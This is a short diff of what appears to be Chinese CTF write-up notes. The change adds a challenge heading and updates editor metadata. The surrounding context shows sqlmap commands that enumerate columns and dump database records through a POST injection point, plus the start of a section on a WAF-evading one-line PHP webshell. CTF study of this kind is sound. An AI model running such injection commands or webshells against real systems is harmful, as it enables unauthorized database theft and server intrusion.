@@ -362,7 +362,8 @@ Sql post 注入
 `py -2 sqlmap -r post.txt -P id -D * -T * --columns` 爆当前数据库表中的字段
 `py -2 sqlmap -r post.txt -P id -D * -T * -C * --dump` 爆当前数据库表中字段的记录
 得到 flag
-## 
+## 秋名山老司机
+
 ## 过狗一句话
 ```php
 <?php 
@@ -387,7 +388,7 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTk5MjI5NTM3NywxNjY0OTY3MTQ2LC0xOD
+eyJoaXN0b3J5IjpbMTU2ODAzOTg5MywxNjY0OTY3MTQ2LC0xOD
 UzNzYzODQ4LC03OTkxMzIyNzIsLTE5NDkxNzMzMTgsNzk1NzE1
 NjI1LDQ1NDEyNTYyMywtMTE3NzQwNzk0NiwtNzc5NjM0Nzg0LC
 02NDU3Nzk2MDYsMTQwMzIzNzE4MSwxNjU1NzgxNTMsNDg0NTM5
